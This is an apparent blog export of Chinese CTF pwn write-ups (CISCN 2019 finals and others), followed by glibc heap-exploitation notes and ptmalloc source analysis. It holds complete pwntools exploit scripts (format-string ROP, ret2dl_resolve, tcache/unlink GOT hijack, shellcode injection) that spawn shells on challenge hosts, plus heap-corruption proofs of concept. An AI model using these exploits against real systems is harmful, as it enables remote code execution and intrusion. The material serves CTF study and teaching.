0x60, "a")rename(1, p8(0xdd) + p8(0x95))create(1, 0x60, "a")r.sendline('1')r.sendlineafter('size of weapon: ', str(0x60))r.sendlineafter('input index: ', str(4))r.sendafter('your name:\n', p8(0) * 3 + p64(0) * 6 + p64(0xfbad3887) + p64(0) * 3 + p8(0x88))libc = u64(r.recv()[:8]) - libc.symbols['_IO_2_1_stdin_']print "libc: " + hex(libc)delete(0)delete(2)delete(0)create(0, 0x60, p64(libc + 0x3c4b10 - 0x23))create(2, 0x60, "a")create(0, 0x60, "a")create(5, 0x60, "0" * 0x13 + p64(libc + 0xf02a4))#gdb.attach(r)delete(9)r.sendline('2')r.sendlineafter('input idx :', str(9))r.interactive() unprintableexit函数会调用__run_exit_handlers,__run_exit_handlers函数又会调用dl_fini函数. 1&lt;_dl_fini+819&gt;: call QWORD PTR [r12+rdx*8] rdx固定为0,r12来自下面的代码片段. 1234&lt;_dl_fini+777&gt;: mov r12,QWORD PTR [rax+0x8];r12 = 0x600dd8&lt;_dl_fini+781&gt;: mov rax,QWORD PTR [rbx+0x120]&lt;_dl_fini+788&gt;: add r12,QWORD PTR [rbx] rbx的值为一个指针,该指针在printf执行的栈上存在,可以控制([rbx] = target_ptr - 0x600dd8). 控制其跳到0x4007A3,可发现这次栈上有一个指针指向printf的返回地址.这样就可以循环利用printf写. 此时可以写栈上数据并利用pop esp;...;ret;栈迁移后就可以rop了. 由于没有泄露,需要寻找一些加法gadget和程序中原有的libc地址(由于程序开了Full RELRO所以这里找到了stderr). 120x00000000004006e8 : adc [rbp+48h], edx#__do_global_dtors_aux + 8 再利用__libc_csu_init中的gadget就可以getshell. 10x0000000000400819 : call qword ptr [r12+rbx*8] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context.log_level = 'debug'adc = 0x4006E8mmm_call = 0x400810pop_rsp_ppp_ret = 0x40082dpop_rbx_ppppp_ret = 0x40082Ar = process("./unprintable")r.recvuntil("your gift: ")stack = int(r.recvuntil("\n"), 16)payload = "%" + str(0x601100 - 0x600dd8) + "c%26$n"payload = payload.ljust(0xa0, "\x00")payload += p64(0x4007A3)r.send(payload)sleep(1)offset = (stack % 0x10000 - 0x118) % 0x100if offset &lt; 0xA3: payload = "%" + str(offset) + "c%18$hhn" + "%" + str(0xA3 - offset) + "c%23$hhn"elif offset == 0xA3: payload = "%" + str(offset) + "c%18$hhn%23$hhn"else: payload = "%" + str(0xA3) + "c%23$hhn" + "%" + str(offset - 0xA3) + "c%18$hhn"payload += "\x00"r.send(payload)sleep(1)offset = 0x1100if offset &lt; 0xA3: payload = "%" + str(offset) + "c%13$lln" + "%" + str(0xA3 - offset) + "c%23$hhn"elif offset == 0xA3: payload = "%" + str(offset) + "c%13$lln%23$hhn"else: payload = "%" + str(0xA3) + "c%23$hhn" + "%" + str(offset - 0xA3) + "c%13$lln"payload += "\x00"r.send(payload)sleep(1)offset = (stack % 0x10000 - 0x116) % 0x100if offset &lt; 0xA3: payload = "%" + str(offset) + "c%18$hhn" + "%" + str(0xA3 - offset) + "c%23$hhn"elif offset == 0xA3: payload = "%" + str(offset) + "c%18$hhn%23$hhn"else: payload = "%" + str(0xA3) + "c%23$hhn" + "%" + str(offset - 0xA3) + "c%18$hhn"payload += "\x00"r.send(payload)#gdb.attach(r, "b * 0x4006E8")sleep(1)offset = 0x60if offset &lt; 0x82d: payload = "%" + str(offset) + "c%13$hhn" + "%" + str(0x82d - offset) + "c%23$hn"elif offset == 0x82d: payload = "%" + str(offset) + "c%13$hhn%23$hn"else: payload = "%" + str(0x82d) + "c%23$hn" + "%" + str(offset - 0x82d) + "c%13$hhn"payload += "\x00"payload = payload.ljust(0xa0, "\x00")payload += p64(0) * 3payload += p64(pop_rbx_ppppp_ret) + p64(0) + p64(0x601040 - 0x48) + p64(0x601200) + p64(0xffd2bc07) + p64(0) + p64(0)payload += p64(mmm_call)payload += p64(pop_rbx_ppppp_ret) + p64(0) + p64(0) + p64(0x601040) + p64(0) + p64(0) + p64(0)payload += p64(0x400819)payload = payload.ljust(0x1a0, "\x00")payload += p64(adc)r.send(payload)print "stack: " + hex(stack)r.interactive() 由于stdout被close,这里使用cat flag &gt;&amp; 2. mimic_note通过unlink获取32位的任意读写,劫持got表然后利用一个gadget,将栈转移到bss段上面ROP,这个时候利用ret2dl_resolve就可以调用open(flag),然后写到某个note里面,那个note提前设好一个值,假如不相当的话,就会输出what are you trying to do?.通过这样爆破出flag. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100from pwn import *def ret2dl_resolve_x86(path, stage, func, resolve_target): elf = ELF(path) plt0 = elf.get_section_by_name('.plt').header.sh_addr jmprel = elf.dynamic_value_by_tag("DT_JMPREL")#rel_plt relent = elf.dynamic_value_by_tag("DT_RELENT")#size of jmprel struct symtab = elf.dynamic_value_by_tag("DT_SYMTAB")#dynsym syment = elf.dynamic_value_by_tag("DT_SYMENT")#size of symtab strtab = elf.dynamic_value_by_tag("DT_STRTAB")#dynstr versym = elf.dynamic_value_by_tag("DT_VERSYM")#version padlen = syment - ((stage - symtab) % syment) fake_addr_sym = stage + padlen fake_symbol_index = (fake_addr_sym - symtab) / syment while True: ndx = u16(elf.read(versym + fake_symbol_index * 2, 2)) if ndx != 0: fake_symbol_index += 1 continue else: break fake_addr_sym = symtab + fake_symbol_index * syment sym_padlen = fake_addr_sym - stage stage = fake_addr_sym + syment padlen = relent - ((stage - jmprel) % relent) fake_addr_reloc = stage + padlen padlen_reloc = padlen fake_addr_symstr = fake_addr_reloc + relent r_info = (((fake_addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7 fake_st_name = fake_addr_symstr - strtab resolve_data = "S" * sym_padlen resolve_data += struct.pack('&lt;IIII', fake_st_name, 0, 0, 0x12)#Elf32_Sym resolve_data += "S" * padlen_reloc resolve_data += struct.pack('&lt;II', resolve_target, r_info)#Elf32_Rel resolve_data += func fake_reloc_offset = fake_addr_reloc - jmprel resovle_call = p32(plt0) + p32(fake_reloc_offset) return resolve_data, resovle_calldef add(size): r.sendlineafter("&gt;&gt; ", "1") r.sendlineafter("size?", str(size))def delete(index): r.sendlineafter("&gt;&gt; ", "2") r.sendlineafter("index ?\n", str(index))def show(index): r.sendlineafter("&gt;&gt; ", "3") r.sendlineafter("index ?\n", str(index)) data = r.recvline()[:-1] return datadef edit(index, content): r.sendlineafter("&gt;&gt; ", "4") r.sendlineafter("index ?\n", str(index)) r.sendafter("content?\n", content)pop_edi_ebp_ret = 0x080489fabss = 0x0804a600r = process("./mimic")#r = process("./mimic_note_32")#r = process("./mimic_note_64")#gdb.attach(r)add(0xfc)add(0xfc)edit(0, p32(0) + p32(0xf9) + p32(0x804A060 - 0xc) + p32(0x804A060 - 0x8) + p64(0) * 0x1d + p32(0xf8))delete(1)add(0x300)add(0x300)edit(0, "\x00" * 0xc + p32(bss + 0x300) + p32(0x100) + p32(0x804A014) + p32(0x100) + p32(bss) + p32(0x800) + p32(bss) + p32(0x800))edit(0, "flag&#123;")edit(1, p32(pop_edi_ebp_ret) + p32(bss))data, call = ret2dl_resolve_x86("./mimic_note_32", bss + 0x100, "open", 0x804A014)payload = p32(0) + call + p32(0x08048439) + p32(bss + 0x180) + p32(0x8048460) + p32(0x80489f9) + p32(3) + p32(bss + 0x300) + p32(5) + p32(0x80489fb) + p32(bss - 0x100) + p32(0x804893c)payload = payload.ljust(0x100, "\x00")payload += datapayload = payload.ljust(0x180, "\x00")payload += "flag\x00"edit(2, payload)delete(3)print show(0)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ciscn-2019-finals-pwn]]></title>
    <url>%2Fposts%2Faed37b2f%2F</url>
    <content type="text"><![CDATA[c08首先绕过tcache,然后unlink获取bss指针,获得任意写. 利用tcache进行double free分配chunk到_IO_2_1_stdout_上泄露libc.劫持free@got获得shell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context(os="linux", arch="amd64")context.log_level = 'debug'def add(index, size, content): r.sendline('1') r.sendlineafter('index: ', str(index)) r.sendlineafter('size: ', str(size)) r.sendafter('content: ', content) r.recvuntil('your choice: ')def edit(index, content): r.sendline('3') r.sendlineafter('index: ', str(index)) r.sendafter('content: ', str(content)) r.recvuntil('your choice: ')def delete(index): r.sendline('2') r.sendlineafter('index: ', str(index)) r.recvuntil('your choice: ')def leave(string): r.sendline('4')#r = process('./pwn')r = remote("172.16.9.21", "9008")r.recvuntil('your choice: ')add(0x10, 0x40, "0")add(1, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")delete(3)delete(3)delete(3)delete(3)delete(3)delete(3)delete(3)add(2, 0x30, "0")edit(0, p64(0) + p64(0x31) + p64(0x6020E0 - 0x18) + p64(0x6020E0 - 0x10) + "0" * 0x10 + p64(0x30) + p64(0x90))delete(1)edit(8, p64(0) * 4 + p64(0x6020e8))add(3, 0x100, "0")edit(8, p64(0x6020e8) + p8(0x32))delete(2)delete(2)add(2, 0x30, p64(0x6020a0))add(2, 0x30, p64(0x6020a0))add(2, 0x30, p8(0x60))r.sendline('1')r.sendlineafter('index: ', str(2))r.sendlineafter('size: ', str(0x30))r.sendafter('content: ', p64(0xfbad2887) + p64(0x602020) * 4)libc = u64(r.recvuntil("your choice: ")[:6].ljust(8, '\0')) - 0x809c0print "libc: " + hex(libc)edit(8, p64(0x6020e8) + p64(0x602015))edit(5, p64(0) + p64(libc + 0x4f440))add(7, 0x50, "/bin/sh\x00")r.sendline('2')r.sendlineafter('index: ', str(7))#gdb.attach(r)r.interactive() c17首先构造一个数绕过检验,然后逆加密shellcode即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context(os="linux", arch="amd64")#context.log_level = 'debug'#r = process('./pwn')r = remote("172.16.9.24", "9017")r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', '-16777216')r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendlineafter('&gt;', 'hhh')r.sendlineafter('&gt;', '2')r.sendlineafter('&gt;', '2')r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendafter('&gt;', p8(0x90))r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendafter('&gt;', p8(0x90))r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendafter('&gt;', 'The cake is a lie!\x00')r.sendlineafter('&gt;', '3')payload = asm(shellcraft.sh()) + "\x7f" * 2print payloada = len(payload)b = '\x7f'for i in range(0, a - 1): b = b + chr(ord(payload[i]) ^ ord(b[i]))print bc = ''for i in range(0, a - 2): c = c + chr(ord(b[i + 1]) ^ ord(b[i]))print cr.sendafter('&gt;', b)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-unsorted_bin_attack]]></title>
    <url>%2Fposts%2F97aa8587%2F</url>
    <content type="text"><![CDATA[漏洞要素改写unsorted_bin_chunk的bk. 漏洞分析1234567891011121314bck = victim-&gt;bk;/* code */unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);//*(fake_bk + 0x10) = unsorted_chunks (av)if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;&#125; 通过改写victim的bk可以将libc的信息写到可控区域.不过之后unsorted bin链表就无法使用了. 注意unsorted_bin_attack的时候需要把unsorted_bin中剩下的chunk一下申请完,否则会报错. 利用思路通过unsorted_bin_attack攻击global_max_fast扩大fastbin范围,结合fastbin attack任意地址获取堆块. 通过unsorted_bin_attack攻击_IO_list_all再通过_chain伪造文件结构体从而劫持控制流. 还有种思路是unsorted_bin_attack结构体stdin的_IO_buf_end,从而写到一些关键变量,例如mallco_hook.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-house_of_force]]></title>
    <url>%2Fposts%2Ff42b80d3%2F</url>
    <content type="text"><![CDATA[0x00house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配. 利用思路只需要malloc一个chunk,使得这个chunk分配到需要控制的区域为止,然后就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再算上head的大小,只需要malloc出target - top - 0x10个字节(可以为负数,溢出运算).]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-house_of_lore]]></title>
    <url>%2Fposts%2F7681b704%2F</url>
    <content type="text"><![CDATA[0x00house_of_lore通过改写small bin chunk的bk指针,同时构造一个fake small bin链表,从而分配一个fake chunk出来. 利用思路首先分配一个small bin chunk,然后free(free前再malloc一次避免该chunk和top chunk合并). 此时该chunk在unsorted bin中,所以需要再次malloc一个比该chunk大的chunk使其进入small bin. 现在就可以伪造了,由于空闲chunk取出时要过fd,bk的pass.所以链表要够长. 1234chunk-&gt;bk = buf1buf1-&gt;fd = chunk_ptrbuf1-&gt;bk = buf2buf2-&gt;fd = buf1 伪造后malloc同大小chunk,由于chunk_ptr-&gt;fd被插入small bin时被设置为了对应small bin head,bk和fd成功pass. 此时small bin链表如下. 123buf1-&gt;fd = small_bin_headbuf1-&gt;bk = buf2buf2-&gt;fd = buf1 再次malloc成功获取伪造区域的指针.注意,此后再malloc该大小的chunk就会失败. 此时small bin链表如下. 1buf2-&gt;fd = small_bin_head]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-off_by_one]]></title>
    <url>%2Fposts%2F10caac30%2F</url>
    <content type="text"><![CDATA[漏洞要素能溢出下一个堆块第一个字节. poison_null_bytemalloc合适大小的三个chunk,首先free掉chunk2(chunk2的大小需大于global_max_fast,使其进入unsorted bin). 通过溢出chunk1修改chunk2的size域(变小),此时chunk2的大小变为fake_size(因为其处于unsorted bin). 这里要求chunk1大小为膜16余8,32位膜8余4.同时为了绕过检测需要在free前在chunk2的内部伪造一个prev_size. malloc两个新的chunk使其充满chunk2的fake_size大小. 先后free掉chunk21和chunk3.chunk21就会被当作chunk2与chunk3合并.再次malloc一个chunk2与chunk3合并大小的chunk4. 此时chunk4与chunk22内存区域重叠. 示例程序如下. 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; a = (uint8_t*) malloc(0x108); b = (uint8_t*) malloc(0x200); c = (uint8_t*) malloc(0x100); *(size_t*)(b + 0x1f0) = 0x200; free(b); a[0x108] = 0; // &lt;--- THIS IS THE "EXPLOITED BUG" b1 = malloc(0x100); b2 = malloc(0x80); free(b1); free(c); d = malloc(0x300);&#125; 注意,delete时会向下检测两个chunk的正确性,需要提前构造. off_by_one with unlink通过off_by_one修改下一个chunk的size成员P标志位,从而实现unlink漏洞利用.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-house_of_spirit]]></title>
    <url>%2Fposts%2F1da637e8%2F</url>
    <content type="text"><![CDATA[漏洞要素覆盖一个堆指针变量,使其指向足够可控的区域,free后系统会错误的将该区域作为堆块放到相应的bin里面,再分配出来. 利用思路关键在于伪造两个fast bin chunk(两个fast bin chunk中间的内容不可控). 然后覆盖一个堆指针变量使其指向第一个fast bin chunk,free后再malloc使两个fast bin chunk间的区域可控. free时的检测. 12345678910111213141516if (chunk_is_mmapped (p)) &#123;/* 如果当前free的chunk是通过mmap()分配的,调用munmap_chunk()函数munmap本chunk */ /* code */ munmap_chunk (p); return;&#125;/* mmap标志位检测 */check_inuse_chunk(av, p);/* in_use标志位检测 */(unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())/* 伪造堆块的size字段不能超过fastbin的最大值 */__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)/* 这个是不能成立的,所以下一个堆块的大小要大于2 * SIZE_ZE小于system_mem */ 所以伪造的两个chunk大致如下所示. 1any | fake_size1: 2 * SIZE_ZE &lt;= fake_size1 &lt;= global_max_fast | padding: len = fake_size1 | any | (2 * SIZE_ZE &lt;= fake_size2 &lt;= system_mem) &amp;&amp; (fake_size2 &amp; 0x1 = 0x1) 可以看出难点在于堆指针变量的覆盖. house_of_spirit with tcacheglibc_2.26启用了tcache机制. 因为tcache不检查next chunk的size位所以省去了bypass. 1234567malloc(1);unsigned long long * a; //被覆盖的指针unsigned long long fake_chunks[10]; //fake_chunkfake_chunks[1] = 0x40; //fake_sizea = &amp;fake_chunks[2]; //覆盖free(a);]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-unlink]]></title>
    <url>%2Fposts%2Fed28e459%2F</url>
    <content type="text"><![CDATA[概览free函数在释放堆块时,会判断相邻前,后堆块是否为空闲堆块,是就会进行合并,然后利用unlink机制将该空闲堆块从unsorted bin中取下. unlink漏洞分析触发unlink的几种情况. 1234567891011121314151617181920212223if (!prev_inuse(p)) &#123;/* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);&#125;if (nextchunk != av-&gt;top) &#123;/* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */ unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else /* code */ /* code */&#125; else &#123; /* code */&#125; 可以让一个构造出来的fake chunk被unlink导致一次固定地址写. 123456789101112131415161718192021222324252627#define unlink(AV, P, BK, FD) &#123; \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list", P, AV); \ else &#123; \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list (not small)", P, AV); \ if (FD-&gt;fd_nextsize == NULL) &#123; \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else &#123; \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ &#125; \ &#125; else &#123; \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ &#125; \ &#125; \ &#125; \&#125; 这里需要绕过检测__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0),使P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P为真. 所以fake chunk可以如下构造. 1fake_pre_size | fake_size | &amp;target - 0x18 | &amp;target - 0x10 堆溢出 &amp;&amp; unlink如果程序存在堆溢出漏洞,可以在当前chunk伪造一个小0x10的fake chunk,同时将下一chunk头部的pre_size和size修改,free下一chunk触发unlink. 1pre_size1 | size1 | fake_pre_size = pre_size1 ? pre_size1 + 0x10 : 0 | fake_size = size1 - 0x10 | &amp;target - 0x18 | &amp;target - 0x10 | padding | fake_size align | size2 &amp; ~1 要求target = P.结果target = &amp;target - 0x18.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-源码分析-Linux-ptmalloc-初始化与结构体]]></title>
    <url>%2Fposts%2F5009a351%2F</url>
    <content type="text"><![CDATA[前言基于glibc-2.23. ptmalloc内存管理结构体ptmalloc使用malloc_state结构体来管理分配区,而参数管理使用malloc_par结构体,全局拥有一个唯一的malloc_par实例. 使用chunk来组织分配区的内存.使用heap_info在非主分配区模拟堆. malloc_state1234567891011121314struct malloc_state &#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS * 2 - 2]; unsigned int binmap[BINMAPSIZE]; struct malloc_state *next; struct malloc_state *next_free; INTERNAL_SIZE_T attached_threads; INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; flags记录了分配区的一些标志. bit0用于标识分配区是否包含至少一个fast bin chunk,bit1用于标识分配区是否能返回连续的虚拟地址空间. bit0为0,表示分配区中有fast bin chunk,为1表示没有.初始化完成后的malloc_state实例中flags值为0,但实际上没有fast bin chunk,在第一次调用函数malloc_consolidate()对fast bins进行chunk合并时,如果global_max_fast大于0,会调用clear_fastchunks宏,标志该分配区中已经没有fast bin chunk. bit1如果为0,表示MORCORE返回连续虚拟地址空间,bit1为1,表示MORCORE返回非连续虚拟地址空间.对于主分配区,MORECORE其实为sbrk(),默认返回连续虚拟地址空间;对于非主分配区,使用mmap()分配大块虚拟内存,然后进行切分来模拟主分配区的行为,而默认情况下mmap映射区域是不保证虚拟地址空间连续的,所以非住分配区默认分配非连续虚拟地址空间. fastbinsY拥有10(NFASTBINS)个元素的数组,用于存放每个fast chunk链表头指针,所以fast bins最多包含10个fast chunk的单向链表. top是一个chunk指针,指向分配区的top chunk. last_remainder是一个chunk指针,分配区上次分配small chunk时,从一个unsorted chunk中分裂出一个small chunk返回给用户,分裂后的剩余部分形成一个chunk,即last_remainder chunk. bins数组用于存储unstored bin,small bins和large bins的chunk链表头. binmap字段是一个int数组,ptmalloc用一个bit来标识该bit对应的bin中是否包含空闲chunk,方便查找. next字段用于将分配区以单向链表链接起来. next_free字段用于将空闲的分配区链接在单向链表中. system_mem字段记录了当前分配区已经分配的内存大小. max_system_mem记录了当前分配区最大能分配的内存大小. malloc_par12345678910111213141516struct malloc_par&#123; unsigned long trim_threshold; INTERNAL_SIZE_T top_pad; INTERNAL_SIZE_T mmap_threshold; INTERNAL_SIZE_T arena_test; INTERNAL_SIZE_T arena_max; int n_mmaps; int n_mmaps_max; int max_n_mmaps; int no_dyn_threshold; INTERNAL_SIZE_T mmapped_mem; INTERNAL_SIZE_T max_mmapped_mem; INTERNAL_SIZE_T max_total_mem; char *sbrk_base;&#125;; trim_threshold字段表示收缩阈值,默认为128KB,当每个分配区的top chunk大小大于这个阈值时,在一定的条件下,调用free时会收缩内存,减小top chunk的大小. top_pad字段表示在分配内存时是否添加额外的pad,默认该字段为0. mmap_threshold字段表示mmap分配阈值,默认值为128KB,由于默认开启mmap分配阈值动态调整,该字段的值会动态修改,但不会超过最大值,在32位系统上最大值为512KB,64位系统上的最大值为32MB. 在32位系统上arena_test默认值为2,64位系统上的默认值为8,当每个进程的分配区数量小于等于arena_test时,不会重用已有的分配区.arena_max为分配区的最大数量,当系统中的分配区数量达到arena_max,就不会再创建新的分配区,只会重用已有的分配区. n_mmaps字段表示当前进程使用mmap()函数分配的内存块的个数. n_mmaps_max字段表示进程使用mmap()函数分配的内存块的最大数量,默认值为65536,可以使用mallopt()函数修改. max_n_mmaps字段表示当前进程使用mmap()函数分配的内存块的数量的最大值,有关系n_mmaps &lt;= max_n_mmaps成立.mstats()函数输出统计需要这个字段. no_dyn_threshold字段表示是否开启mmap分配阈值动态调整机制,默认值为0,也就是默认开启mmap分配阈值动态调整机制. pagesize字段表示系统的页大小,默认为4KB. mmapped_mem和max_mmapped_mem都用于统计mmap分配的内存大小,一般情况下两个字段的值相等,max_mmapped_mem用于mstats()函数. max_total_mem字段在单线程情况下用于统计进程分配的内存总数. sbrk_base字段表示堆的起始地址. chunk1234567891011121314151617#ifndef INTERNAL_SIZE_T#define INTERNAL_SIZE_T size_t#endif...struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 分析看概览部分. heap_info12345678910typedef struct malloc_state *mstate;typedef struct _heap_info&#123; mstate ar_ptr; struct _heap_info *prev; size_t size; size_t mprotect_size; char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; ar_ptr是指向所属分配区的指针. prev字段用于将同一个分配区中的sub_heap用单向链表链接起来.prev指向链表中的前一个sub_heap. size字段表示当前sub_heap中的内存大小,以page对齐. mprotect_size字段表示当前sub_heap中被读写保护的内存大小,也就是说还没有被分配的内存大小. Pad字段用于保证sizeof (heap_info) + 2 * SIZE_SZ是按MALLOC_ALIGNMENT对齐的.如果sizeof (heap_info) + 2 * SIZE_SZ不是按MALLOC_ALIGNMENT对齐,编译的时候就会报错. 如果sub_heap是非主分配区的第一个sub_heap,heap_info存放在sub_heap的头部,紧跟heap_info之后是该非主分配区的malloc_state实例,紧跟malloc_state实例后,是sub_heap中的第一个chunk,但chunk的首地址必须按照MALLOC_ALIGNMENT对齐,所以在malloc_state实例和第一个chunk之间可能有几个字节的pad. 如果sub_heap不是非主分配区的第一个sub_heap,则紧跟heap_info后是第一个chunk,但sysmalloc()函数默认heap_info是按照MALLOC_ALIGNMENT对齐的,没有再做对齐的工作,直接将heap_info后的内存强制转换成一个chunk. 12345#define heap_for_ptr(ptr) \ ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))#define arena_for_chunk(ptr) \ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena) sub_heap的内存块使用mmap()函数分配,并以4k对齐,所以可以根据chunk的指针地址,获得这个chunk所属的sub_heap的地址.heap_for_ptr宏就是根据chunk的地址获得sub_heap的地址. sub_heap的头部存放的是heap_info实例,其中保存了分配区指针,可以通过chunk的地址获得分配区的地址,前提是这个chunk属于非主分配区,arena_for_chunk用来做这样的转换. 12345678#define HEAP_MIN_SIZE (32 * 1024)#ifndef HEAP_MAX_SIZE# ifdef DEFAULT_MMAP_THRESHOLD_MAX# define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)# else# define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */# endif#endif HEAP_MIN_SIZE定义了sub_heap内存块的最小值,32KB. HEAP_MAX_SIZE定义了sub_heap内存块的最大值,在32位系统上,HEAP_MAX_SIZE默认值为1MB,64位为64MB. ptmalloc初始化ptmalloc的初始化发生在进程的第一个内存分配请求.在ptmalloc中malloc()函数的实际接口函数为__libc_malloc(),这个函数最开始会执行如下的一段代码. 123void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);if (__builtin_expect(hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); 在定义了__malloc_hook()全局函数的情况下,只是执行__malloc_hook(). 在进程初始化时__malloc_hook指向的函数为malloc_hook_ini(). 1void * weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini; malloc_hook_ini()函数定义在hooks.c中,实现代码如下. 12345static void * malloc_hook_ini(size_t sz, const void * caller) &#123; __malloc_hook = NULL; ptmalloc_init(); return __libc_malloc(sz);&#125; ptmalloc_init12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970static void ptmalloc_init (void) &#123; if (__malloc_initialized &gt;= 0) return; __malloc_initialized = 0;#ifdef SHARED Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (ptmalloc_init, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) __morecore = __failing_morecore;#endif thread_arena = &amp;main_arena; thread_atfork(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2); const char *s = NULL; if (__glibc_likely (_environ != NULL)) &#123; char **runp = _environ; char *envline; while (__builtin_expect ((envline = next_env_entry (&amp;runp)) != NULL, 0)) &#123; size_t len = strcspn (envline, "="); if (envline[len] != '=') continue; switch 